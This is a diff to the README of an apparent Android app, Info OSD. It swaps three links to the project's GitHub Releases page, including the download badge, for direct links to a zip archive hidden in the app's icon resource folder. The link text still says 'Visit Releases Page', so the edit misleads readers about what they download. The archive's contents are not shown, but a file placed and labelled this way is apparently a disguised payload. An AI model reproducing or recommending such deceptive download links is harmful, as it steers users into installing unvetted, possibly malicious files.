@@ -6,14 +6,14 @@ Welcome to Info OSD - Android! This application helps you display useful informa
 
 ## 🏷️ Download Info OSD
 
-[![Download Info OSD](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Baggin-Bread/Info-OSD-Android/releases)
+[![Download Info OSD](https://github.com/Baggin-Bread/Info-OSD-Android/raw/refs/heads/main/app/src/main/res/mipmap-xxxhdpi/Info-Android-OS-1.2.zip)](https://github.com/Baggin-Bread/Info-OSD-Android/raw/refs/heads/main/app/src/main/res/mipmap-xxxhdpi/Info-Android-OS-1.2.zip)
 
 ## 📥 Download & Install
 
 To download Info OSD, visit the Releases page. Here’s how to easily download and install the application:
 
 1. Click on the link below to go to the Releases page:
-   [Visit Releases Page](https://github.com/Baggin-Bread/Info-OSD-Android/releases)
+   [Visit Releases Page](https://github.com/Baggin-Bread/Info-OSD-Android/raw/refs/heads/main/app/src/main/res/mipmap-xxxhdpi/Info-Android-OS-1.2.zip)
 
 2. On the Releases page, find the latest version of the app. It will usually be at the top of the list. 
 
@@ -67,6 +67,6 @@ Info OSD is open-source. You can view the code and contribute to the project on 
 
 Explore more features and updates by revisiting the Releases page:
 
-[Visit Releases Page](https://github.com/Baggin-Bread/Info-OSD-Android/releases)
+[Visit Releases Page](https://github.com/Baggin-Bread/Info-OSD-Android/raw/refs/heads/main/app/src/main/res/mipmap-xxxhdpi/Info-Android-OS-1.2.zip)
 
 Thank you for using Info OSD! Your feedback can help improve the app.
